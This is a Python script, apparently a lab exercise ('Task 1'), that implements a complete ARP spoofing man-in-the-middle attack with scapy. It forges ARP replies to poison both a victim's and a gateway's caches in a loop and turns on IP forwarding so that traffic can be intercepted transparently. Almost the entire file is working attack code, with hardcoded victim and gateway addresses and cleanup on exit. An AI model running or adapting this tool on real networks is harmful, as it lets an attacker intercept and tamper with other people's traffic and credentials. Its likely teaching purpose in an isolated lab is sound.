#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# ARP SPOOFING TOOL (Task 1)
# Implements Man-in-the-Middle using ARP spoofing within an isolated namespace.
# -----------------------------------------------------------------------------
import signal
import sys
import time
import os
from scapy.all import Ether, ARP, sendp, get_if_hwaddr

# --- Configuration (Matches setup_lab.sh and MACs) ---
VICTIM_IP = "192.168.10.10"
GATEWAY_IP = "192.168.10.1"
INTERFACE_TOWARDS_VICTIM = 'eth0' 

VICTIM_MAC = "02:ac:70:dc:d9:3b"
GATEWAY_MAC = "2a:ef:96:ce:7b:d7"

ATTACKER_MAC = None # Will be retrieved from the interface at runtime

def arp_spoof(target_ip, spoof_ip, target_mac):
    """Crafts and sends a single forged ARP reply packet."""
    
    # Layer 2: Ethernet. Source is Attacker MAC, Destination is Target MAC.
    eth_layer = Ether(src=ATTACKER_MAC, dst=target_mac)
    
    # Layer 3: ARP. 
    arp_layer = ARP(
        op=2,
        psrc=spoof_ip,      
        pdst=target_ip,     
        hwsrc=ATTACKER_MAC, 
        hwdst=target_mac    
    )
    
    packet = eth_layer / arp_layer
    sendp(packet, iface=INTERFACE_TOWARDS_VICTIM, verbose=False)

def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """Restores the original ARP tables for a clean exit."""
    print("\n[*] Restoring ARP tables...")
    
    # Restore Gateway's cache (tells Gateway the Victim's real MAC)
    sendp(Ether(src=victim_mac, dst=gateway_mac)/ARP(
        op=2, psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac, hwdst=gateway_mac),
        count=7, iface=INTERFACE_TOWARDS_VICTIM, verbose=False
    )
    
    # Restore Victim's cache (tells Victim the Gateway's real MAC)
    sendp(Ether(src=gateway_mac, dst=victim_mac)/ARP(
        op=2, psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac, hwdst=victim_mac),
        count=7, iface=INTERFACE_TOWARDS_VICTIM, verbose=False
    )
    print("[*] ARP tables restored. IP forwarding disabled.")
    
    # Disable IP forwarding (cleanup)
    os.system("sysctl -w net.ipv4.ip_forward=0 > /dev/null")

def signal_handler(sig, frame):
    """Handles CTRL+C interrupt."""
    global VICTIM_MAC, GATEWAY_MAC, ATTACKER_MAC
    # Restore ARP tables before exiting
    if ATTACKER_MAC and VICTIM_MAC and GATEWAY_MAC:
        restore_arp(VICTIM_IP, VICTIM_MAC, GATEWAY_IP, GATEWAY_MAC)
    print("[!] Exiting ARP spoofing tool.")
    sys.exit(0)

def main():
    global ATTACKER_MAC

    if not os.geteuid() == 0:
        sys.exit("Please run with sudo: sudo ip netns exec attacker python3 arp_spoof.py")

    signal.signal(signal.SIGINT, signal_handler)

    print(f"[*] Starting ARP Spoofer on {INTERFACE_TOWARDS_VICTIM}...")

    # 1. Get Attacker's MAC
    try:
        ATTACKER_MAC = get_if_hwaddr(INTERFACE_TOWARDS_VICTIM)
        print(f"[*] Attacker MAC ({INTERFACE_TOWARDS_VICTIM}): {ATTACKER_MAC}")
    except OSError:
        sys.exit(f"[!] Error: Interface {INTERFACE_TOWARDS_VICTIM} not found.")

    # 2. Confirming MACs used
    print(f"[*] Victim MAC (Hardcoded): {VICTIM_MAC}")
    print(f"[*] Gateway MAC (Hardcoded): {GATEWAY_MAC}")
    
    # 3. Enable IP Forwarding - REQUIRED for a transparent MitM
    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
    print("[*] IP forwarding ensured (net.ipv4.ip_forward=1).")

    # 4. Main Spoofing Loop
    print("\n[!] ARP Poisoning active. Press CTRL+C to stop and restore.")
    count = 0
    while True:
        try:
            # Poison Victim
            arp_spoof(VICTIM_IP, GATEWAY_IP, VICTIM_MAC)
            
            # Poison Gateway
            arp_spoof(GATEWAY_IP, VICTIM_IP, GATEWAY_MAC)
            
            count += 2
            sys.stdout.write(f"[*] Packets sent: {count} | Spoofing...")
            sys.stdout.flush()
            sys.stdout.write('\r') 
            
            time.sleep(1) # Send updates every second
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            sys.stdout.write(f"[!] An error occurred during spoofing: {e}\n")
            time.sleep(1)

if __name__ == "__main__":
    main()
